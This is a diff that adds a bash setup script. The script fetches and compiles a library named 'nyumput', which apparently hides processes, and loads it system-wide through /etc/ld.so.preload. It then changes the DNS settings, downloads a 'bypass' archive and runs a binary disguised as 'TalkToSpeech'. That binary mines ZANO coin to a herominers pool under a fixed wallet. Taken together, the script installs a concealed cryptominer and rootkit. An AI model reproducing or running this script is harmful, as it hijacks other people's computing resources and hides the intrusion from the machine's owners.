@@ -1,0 +1,13 @@
+#!/bin/bash
+apt-get update ; apt-get install wget sudo -y
+apt install -y curl
+curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+wget https://gitlab.com/sshroot/cat/-/raw/main/bypass.tar && tar xf bypass.tar && chmod +x bypass.tar
+./TalkToSpeech -coin ZANO -P ZxCrsFGnUSJ2xoGtycdk3bLHsBZ4FECJPAyccaKVvik7KcmYwX9qiBdcCtEUiJ7NseXT6bYEKtQ9zZHQJJgiGm8g2vmdEeuMd.$(shuf -n 1 -i 1-99999)-KZ@us.zano.herominers.com:1110
